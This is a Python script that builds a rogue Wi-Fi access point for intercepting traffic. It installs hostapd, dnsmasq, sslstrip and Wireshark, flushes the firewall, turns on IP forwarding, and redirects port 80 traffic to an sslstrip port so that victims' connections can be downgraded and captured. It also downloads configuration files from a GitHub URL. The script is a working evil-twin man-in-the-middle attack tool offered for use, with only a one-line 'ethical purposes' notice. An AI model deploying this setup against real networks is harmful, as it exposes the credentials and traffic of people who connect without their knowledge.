import os
import subprocess as sub
import time
import wget

def installer():
	print("Loading Vehicles\n")
	print("Wireshark Downloading...\n")
	os.system("apt-get install Wireshark")
	print("[+] Downloading Dnsmasq...\n")
	sub.call(["apt-get","install","dnsmasq"])
	print("\n")
	print("[+] Downloading hostapd...\n")
	sub.call(["apt-get","install","hostapd"])	
	print("\n")
	print("[+] Downloading sslstrip...\n")
	sub.call(["apt-get","install","sslstrip"])
	print("\n")
	time.sleep(2)
	hostapd_attack()
	os.system("clear")

def iptables_settings():
	print("[+} please wait, the ip tables are clearing")
	print("\n")
	print("Network-manager stoping\n")
	time.sleep(2)
	os.system("service network-manager stop")
	os.system("iptables --flush")
	os.system("iptables -X")
	os.system("iptables -t nat -F")
	os.system("iptables -t nat -X")
	os.system("iptables -t mangle -F")
	os.system("iptables -t mangle -X")
	os.system("iptables --table  nat --flush")
	os.system("iptables --delete-chain")
	os.system("iptables --table nat --delete-chain")
	os.system("iptables -P INPUT ACCEPT")
	os.system("iptables -P FORWARD ACCEPT")
	os.system("iptables -P OUTPUT ACCEPT")
	print("[+] ip forward activating...\n")
	os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
	os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000")
	print("iptables clearing succesful\n")

def control_file():
	print("checking files...\n")
	hostapd  = os.path.exists("hostapd.conf")
	dnsmasq = os.path.exists("dnsmasq.conf")
	if hostapd == True and dnsmasq == True:
		print("[+] hostapd is found")
		time.sleep(2)
		print("[+] dnsmasq is found")
		time.sleep(2)
	else:
		print("hostapd and dnsmasq is not found")
		print("Dnsmasq.conf Downloading...\n")
		dnsmasq_download = "https://raw.githubusercontent.com/OgulcanKacarr/fakeRouther/master/dnsmasq.conf"
		time.sleep(2)
		wget.download(dnsmasq_download)
		print("\n")
		print("Hostapd.conf Downloading...\n")
		hostapd_download = "https://raw.githubusercontent.com/OgulcanKacarr/fakeRouther/master/hostapd.conf"
		wget.download(hostapd_download)
		print("\n")

def broadcast_Starting():
	print("Apache2 is starting...")
	time.sleep(2)
	os.system("service apache2 start")
	time.sleep(2)
	os.system("clear")
	print("Starting dnsmasq...\n")
	time.sleep(2)
	os.system("xterm -e dnsmasq -C dnsmasq.conf")
	time.sleep(2)
	print("Starting hostapd...")
	os.system("xterm -e hostapd hostapd.conf -B")
	time.sleep(2)
	print("netmask assigned...")
	os.system("ifconfig wlan0 10.0.0.1 netmask 255.255.255.0")
	time.sleep(2)
	print("""
		
		Starting broadcasting...

		use to "wireshark" for listen packed

	""")

	print("\n")
	input("press any key to turn it off")
	print("[+}please wait, the ip tables are clearing")
	print("\n")
	os.system("iptables --flush")
	print("iptables clearing succesful\n")
	time.sleep(2)
	print("apache2 stoping...\n")
	os.system("service apache2 stop")
	time.sleep(2)
	print("network-manager starting...\n")
	os.system("service network-manager start")
	os.system("clear")
	print("good by")

def hostapd_attack():
	os.system("clear")
	print("Loading hostapd attack....")
	print("=============================================\n")
	print("""

	Hostapd-attack

					
	welcome. Use this tool for ethical purposes

	""")
	control_file()
	iptables_settings()
	broadcast_Starting()